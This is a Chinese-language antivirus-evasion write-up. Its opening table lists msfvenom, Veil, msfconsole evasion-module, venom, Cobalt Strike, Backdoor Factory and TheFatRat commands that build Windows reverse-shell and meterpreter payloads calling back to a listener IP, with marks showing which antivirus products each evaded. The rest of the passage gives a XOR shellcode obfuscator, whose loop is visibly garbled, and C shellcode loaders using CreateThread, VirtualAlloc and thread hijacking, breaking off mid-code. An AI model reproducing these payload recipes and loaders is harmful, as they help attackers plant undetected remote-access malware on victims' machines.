| msfvenom        | √           | √                | √    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51016 -f exe -i 10  -b "\x00" -e x86/shikata_ga_nai -o 51016.exe |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use autoit/shellcode_inject/flat.py     generate     Ordnance     use 4     set LHOST 192.168.43.128     set LPORT 51017     set Encoder xor     generate     51017          exit |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use go/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51018     set encoder xor     generate     51018          exit |
| veil            | ×           | ×                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51019     set encoder xor     generate     51019          exit |
| msfconsole      | ×           | ×                | ×    | ×    | msfconsole -x "use  windows/applocker_evasion_install_util;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51020;\set filename 51020.txt;\run;\exit" |
| msfconsole      | ×           | ×                | ×    | ×    | msfconsole -x "use  evasion/windows/applocker_evasion_workflow_compiler;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51021;\set XML_FILE 51021.xml;\set XOML_FILE 51021.xoml;\run;\exit" |
| msfconsole      | ×           | ×                | ×    | √    | msfconsole -x "use  evasion/windows/applocker_evasion_msbuild;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51022;\set filename 51022.txt;\run;\exit" |
| msfconsole      | ×           | √                | ×    | ×    | msfconsole -x "use  evasion/windows/applocker_evasion_presentationhost;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51023;\set CSPROJ_FILE 51023.csproj;\set CS_FILE 51023.xaml.cs;\set  MANIFEST_FILE 51023.manifest;\run;\exit" |
| msfconsole      | ×           | ×                | ×    | ×    | msfconsole -x "use  evasion/windows/applocker_evasion_regasm_regsvcs;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51024;\set SNK_FILE 51024.snk;\set TXT_FILE 51024.txt;\run;\exit" |
| msfvenom        | ×           | √                | ×    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51025 -f exe -x  csc-v4.0.30319x86.exe -o 51025.exe |
| msfvenom        | ×           | √                | ×    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51026 -f exe -x  csc-v4.0.30319x86.exe -i 10 -b "\x00" -e x86/shikata_ga_nai -o  51026.exe |
| msfconsole      | ×           | √                | ×    | ×    | msfconsole -x "use  evasion/windows/process_herpaderping;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51027;\set filename 51027.exe;\run;\exit" |
| venom           | ×           | √                | ×    | √    | 2     4     192.168.43.128     51028     windows/meterpreter/reverse_tcp     51028     None-Obfuscation |
| venom           | ×           | ×                | ×    | √    | 2     4     192.168.43.128     51029     windows/meterpreter/reverse_tcp     51029     String Obfuscation（3 s） |
| venom           | ×           | √                | ×    | √    | 2     4     192.168.43.128     51030     windows/shell/reverse_tcp     51030     None-Obfuscation |
| venom           | ×           | √                | ×    | √    | 2     4     192.168.43.128     51031     windows/shell/reverse_tcp     51031     String Obfuscation（3 s） |
| venom           | √           | √                | ×    | ×    | 2     5     192.168.43.128     51032     windows/meterpreter/reverse_tcp     51032 |
| venom           | √           | √                | ×    | ×    | 2     5     192.168.43.128     51033     windows/shell/reverse_tcp     51033 |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51034     windows/shell/reverse_tcp     51034     default(shellcode.py)python |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51035     windows/shell/reverse_tcp     51035     pyherion(shellcode.py)obfuscated |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51036     windows/shell/reverse_tcp     51036     NXcrypt(shellcode.py)obfuscated |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51037     windows/shell/reverse_tcp     51037     pyinstaller(shellcode.exe)executable |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51038     windows/meterpreter/reverse_tcp     51038     default(shellcode.py)python |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51039     windows/meterpreter/reverse_tcp     51039     pyherion(shellcode.py)obfuscated |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51040     windows/meterpreter/reverse_tcp     51040     NXcrypt(shellcode.py)obfuscated |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51041     windows/meterpreter/reverse_tcp     51041     pyinstaller(shellcode.exe)executable |
| venom           | √           | √                | √    | √    | 2     15     192.168.43.128     51042     windows/meterpreter/reverse_tcp     51042 |
| venom           | √           | √                | √    | √    | 2     15     192.168.43.128     51043     windows/shell/reverse_tcp     51043 |
| venom           | -           | -                | -    | -    | 2     16     192.168.43.128     51044     windows/meterpreter/reverse_https     51044 |
| venom           | -           | -                | -    | -    | 2     16     192.168.43.128     51045     windows/meterpreter/reverse_winhttps     51045 |
| venom           | -           | -                | -    | -    | 2     17     192.168.43.128     51046     3     windows/meterpreter/reverse_http     51046 |
| venom           | -           | -                | -    | -    | 2     18     The full path of your agent.exe     192.168.43.128     51047     windows/shell/reverse_tcp |
| venom           | ×           | ×                | ×    | ×    | 2     18     The full path of your csc-v4.0.30319x86.exe     192.168.43.128     51048     windows/meterpreter/reverse_tcp |
| venom           | -           | -                | -    | √    | 2     19     192.168.43.128     51049     windows/meterpreter/reverse_tcp |
| venom           | -           | -                | -    | √    | 2     19     192.168.43.128     51050     windows/meterpreter/reverse_winhttps |
| venom           | -           | -                | -    | -    | venom-20                                                     |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51052"     Attacks>Packages>Windows Execuation>Windows EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51053"     Attacks>Packages>Windows Execuation>Windows EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51054"     Attacks>Packages>Windows Execuation(stageless)>Windows EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51055"     Attacks>Packages>Windows Execuation(stageless)>Windows EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51056"     Attacks>Packages>Windows Execuation>Windows Service EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51057"     Attacks>Packages>Windows Execuation>Windows Service EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51058"     Attacks>Packages>Windows Execuation(stageless)>Windows Service EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51059"     Attacks>Packages>Windows Execuation(stageless)>Windows Service EXE |
| cobaltstrike    | ×           | ×                | ×    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51060"     Attacks>Packages>Windows Execuation(stageless)>powershell |
| cobaltstrike    | ×           | ×                | ×    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51061"     Attacks>Packages>Windows Execuation(stageless)>powershell |
| backdoorfactory | √           | √                | ×    | ×    | ./backdoor.py -f  workspace/calc.exe -s cave_miner_inline -J -H 192.168.43.128 -P 51062 -o 51062.exe     9     10     11 |
| theFatRat       | ×           | ×                | ×    | ×    | proxychains ./fatrat               2     [ 1 ] - Powerstager 0.2.5 by z0noxz (powershell) (NEW)     192.168.43.128     51063     51063     2     access.ico |
| theFatRat       | √           | ×                | ×    | ×    | proxychains ./fatrat               2     [ 2 ] - slow but useful     192.168.43.128     51064     51064     2 |
| theFatRat       | ×           | ×                | √    | √    | proxychains ./fatrat          6     1     192.168.43.128     51065     51065     2 windows/shell/reverse_tcp |
| theFatRat       | ×           | ×                | √    | √    | proxychains ./fatrat          6     1     192.168.43.128     51066     51066     3 windows/meterpreter/reverse_tcp |
| theFatRat       | ×           | ×                | ×    | √    | proxychains ./fatrat          6     2     192.168.43.128     51067     51067     2 windows/shell/reverse_tcp |
| theFatRat       | ×           | ×                | ×    | √    | proxychains ./fatrat          6     2     192.168.43.128     51068     51068     3 windows/meterpreter/reverse_tcp |
| theFatRat       | ×           | ×                | ×    | √    | proxychains ./fatrat          6     3     192.168.43.128     51069     51069     6 windows/meterpreter/reverse_https |
| theFatRat       | ×           | ×                | ×    | √    | proxychains ./fatrat          6     4     192.168.43.128     51070     51070     3 windows/meterpreter/reverse_tcp |
| theFatRat       | √           | √                | √    | √    | proxychains ./fatrat          6     5     192.168.43.128     51071     51071     2 windows/shell/reverse_tcp |
| theFatRat       | ×           | ×                | ×    | ×    | proxychains ./fatrat          6     7     192.168.43.128     51072     51072     #2 windows/shell/reverse_tcp |
## 0x02 定制与开发
下面给出一些在实战shellcode加载类免杀中用到的一些免杀tips。这里不会给出具体的代码，而是给出一些模块的实现思想，将这些模块进行简单组合就能达到不错的免杀效果。而这些模块的开发与实现成本非常低。
### 1 文件免杀
#### 1.1 shellcode混淆器
shellcode混淆器用于“源码编译类的小远控”场景下中掩盖stager内shellcode的静态特征。
shellcode混淆器的开发成本非常低，可以采用自定义的编码算法对原有shellcode进行混淆，进而掩盖原生shellcode内的静态特征。
- 下面给出一个简单的异或混淆器demo。
```c
#混淆器
void x(unsigned char* raw_buf, unsigned int size) {
    for (int i = 0; i = 0; i--) {
        ......
        raw_buf[i] = raw_buf[i] ^ raw_buf[j] + (unsigned char)size;
    }
}
```
#### 1.2 加载器
“源码编译类的小远控”场景下加载器的实现方式非常多，目前收集了一些C语言下的常见加载器。可以简单将他们分成以下3类：
##### 1.2.1 函数指针加载器
###### # 函数指针型加载器
下面是一个最简单的C语言函数指针型加载器。
```c
void func_p01nt3r_1() {
    void (*func)();
    func = (void (*)()) (void*)raw_buf;
    (void)(*func)();
}
```
##### 1.2.2 线程创建类加载器
此类加载器基本遵循以下流程：
**step 1.**shellcode复制到申请的内存页上。
**step 2.**设置内存页的权限位上加上可执行权限。
**step 3 .**使用线程创建类函数直接执行该内存块上的内容。
###### # CreateThread加载器-1
```c
void cr34te_thr34d_1() {
    //#include 
#include 
    LPVOID lpvAddr = (LPVOID)malloc(1024);
    memset(lpvAddr, '\x00', 1024);
    memcpy(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), PAGE_EXECUTE_READWRITE, &pa);//PAGE_EXECUTE
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```
###### # CreateThread加载器-2
```c
void cr34te_thr34d_2() {
    //#include 
    LPVOID lpvAddr = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), 0x10, &pa);
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```
###### # CreateThread加载器-3
```C
void cr34te_thr34d_3() {
    HANDLE heap;
    heap = (int*)HeapCreate(0, 0x00, 0xfff);
    LPVOID lpvAddr;
    lpvAddr = (LPVOID)HeapAlloc(heap, 0, 1024);
    memset(lpvAddr, '\x00', 1024);
    memcpy(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), PAGE_EXECUTE_READWRITE, &pa);//PAGE_EXECUTE
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```
###### # CreateThread加载器-4
```C
void cr34te_thr34d_4() {
    //#include 
    LPVOID lpvAddr = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
    RtlMoveMemory(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), 0x10, &pa);
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```
除了上面使用的CreateThread函数以外，理论上还有很多其他替代的函数。如"\_beginThreadex","pthread_create"。由于没有具体测试过，就不附进来了。不同函数的组合能一定程度上对代码静态分析产生干扰达到简单的绕过。
##### 1.2.3 线程劫持类加载器
###### # VirtualAllocEx加载器-1
```C
void thr34d_h1j4ck1ng_1() {
    // visual studio 2019
    SIZE_T size = 0;
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    BOOL success = CreateProcessA(
        NULL,